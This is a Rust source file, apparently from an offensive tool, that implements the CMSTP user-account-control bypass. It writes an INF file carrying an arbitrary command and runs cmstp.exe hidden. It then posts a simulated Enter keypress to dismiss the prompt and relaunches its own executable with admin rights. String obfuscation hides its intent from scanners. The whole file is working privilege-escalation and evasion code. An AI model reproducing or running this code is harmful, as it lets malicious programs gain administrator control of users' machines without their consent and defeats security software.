// https://oddvar.moe/2017/08/15/research-on-cmstp-exe/
use anyhow::{ anyhow, Context, Result };
use obfstr::obfstr as s;
use std::fs::create_dir_all;
use std::io::Write;
use std::path::PathBuf;
use std::{ env, ptr };
use std::time::Duration;
use std::{ fs, time::Instant };
use winapi::{
    shared::minwindef::{ BOOL, DWORD, FALSE, LPARAM, MAX_PATH, TRUE },
    shared::windef::HWND,
    um::{
        processthreadsapi::OpenProcess,
        psapi::GetModuleFileNameExA,
        shellapi::{ ShellExecuteExW, SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOW },
        winnt::{ PROCESS_QUERY_INFORMATION, PROCESS_VM_READ },
        winuser::{
            EnumWindows,
            GetWindowThreadProcessId,
            PostMessageA,
            SW_HIDE,
            SW_SHOW,
            VK_RETURN,
            WM_KEYDOWN,
            WM_KEYUP,
        },
    },
};
use crate::utils::functions::get_current_exe;

pub struct WindowInfo {
    name: String,
    hwnd: HWND,
}

fn _clean_up_uac(tmp_path: &PathBuf) -> Result<()> {
    fs::remove_file(tmp_path).context(s!("Failed to remove temp file").to_string())?;
    Ok(())
}

pub fn shell_execute(tmp_path: &PathBuf, show_window: bool) -> Result<()> {
    let payload = s!("cmstp.exe").to_owned();
    let params = format!(
        "{}{}",
        s!("/au "),
        tmp_path.to_str().context(s!("Failed to convert tmp_path to str").to_string())?.to_owned()
    );

    let payload_wide: Vec<u16> = payload.encode_utf16().chain(std::iter::once(0)).collect();
    let params_wide: Vec<u16> = params.encode_utf16().chain(std::iter::once(0)).collect();

    let mut shell_info = SHELLEXECUTEINFOW {
        cbSize: std::mem::size_of::<SHELLEXECUTEINFOW>() as DWORD,
        fMask: SEE_MASK_NOCLOSEPROCESS,
        hwnd: ptr::null_mut(),
        lpVerb: ptr::null(),
        lpFile: payload_wide.as_ptr(),
        lpParameters: params_wide.as_ptr(),
        lpDirectory: ptr::null(),
        nShow: if show_window {
            SW_SHOW
        } else {
            SW_HIDE
        },
        hInstApp: ptr::null_mut(),
        lpIDList: ptr::null_mut(),
        lpClass: ptr::null(),
        hkeyClass: ptr::null_mut(),
        dwHotKey: 0,
        hMonitor: ptr::null_mut(),
        hProcess: ptr::null_mut(),
    };

    let success = unsafe { ShellExecuteExW(&mut shell_info) != 0 };

    if !success {
        return Err(anyhow!(s!("Failed to open Service Control Manager").to_string()));
    }
    Ok(())
}

pub fn execute_as_admin_cmstp_method(command: &str) -> Result<()> {
    let inf_template = format!(
        "{}{}{}",
        s!(
            r#"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
"#
        ),
        command,
        s!(
            r#"

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", "")

[Strings]
ServiceName="Connect"
ShortSvcName="Connect"
"#
        )
    );
    let temp_file_dir = env::temp_dir().join(s!("temp_1972449")).join(s!("cache"));

    create_dir_all(&temp_file_dir).context(
        s!("Failed to create_dir_all FOR temp_file_dir").to_string()
    )?;

    let tmp_file_path = temp_file_dir.join(s!("tmp.ini"));

    let mut tmp_file = std::fs::File
        ::create(&tmp_file_path)
        .context(s!("Failed to create tmp.ini").to_string())?;

    tmp_file.write(&inf_template.as_bytes()).context(s!("Failed to write to tmp.ini").to_string())?;

    shell_execute(&tmp_file_path, false).context(s!("Failed to shell_execute").to_string())?;

    let start_time = Instant::now();
    let timeout = Duration::from_secs(15);

    loop {
        let sent = send_key_to_exe(s!("cmstp.exe"));
        if sent {
            break;
        }

        if start_time.elapsed() > timeout {
            break;
        }
    }

    Ok(())
}

pub fn open_self_as_admin() -> Result<()> {
    let binding = get_current_exe();
    let curent_executable = binding.to_str().unwrap();

    execute_as_admin_cmstp_method(curent_executable).context(
        s!("failed to execute as admin").to_string()
    )?;
    Ok(())
}

pub fn find_window_by_exe(exe_name: &str) -> Option<HWND> {
    let mut info_data = WindowInfo {
        name: exe_name.to_string(),
        hwnd: ptr::null_mut(),
    };

    unsafe {
        EnumWindows(Some(enum_window), &mut info_data as *mut WindowInfo as LPARAM);

        if !info_data.hwnd.is_null() {
            Some(info_data.hwnd)
        } else {
            None
        }
    }
}

unsafe extern "system" fn enum_window(hwnd: HWND, lparam: LPARAM) -> BOOL {
    let info_data = &mut *(lparam as *mut WindowInfo);

    let mut process_id: DWORD = 0;
    GetWindowThreadProcessId(hwnd, &mut process_id);

    let process_handle = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE,
        process_id
    );

    if !process_handle.is_null() {
        let mut exe_path = [0u8; MAX_PATH];
        let len = GetModuleFileNameExA(
            process_handle,
            ptr::null_mut(),
            exe_path.as_mut_ptr() as *mut i8,
            MAX_PATH as u32
        ) as usize;

        if len > 0 {
            let path = String::from_utf8_lossy(&exe_path[..len]).to_string();
            let found_exe = path.split('\\').last().unwrap_or("").to_lowercase();

            if found_exe == info_data.name.to_lowercase() {
                info_data.hwnd = hwnd;
                return FALSE;
            }
        }
    }

    TRUE
}

pub fn send_key_to_exe(exe_name: &str) -> bool {
    if let Some(hwnd) = find_window_by_exe(exe_name) {
        unsafe {
            PostMessageA(hwnd, WM_KEYDOWN, VK_RETURN as usize, 0);
            PostMessageA(hwnd, WM_KEYUP, VK_RETURN as usize, 0);
            return true;
        }
    }
    false
}
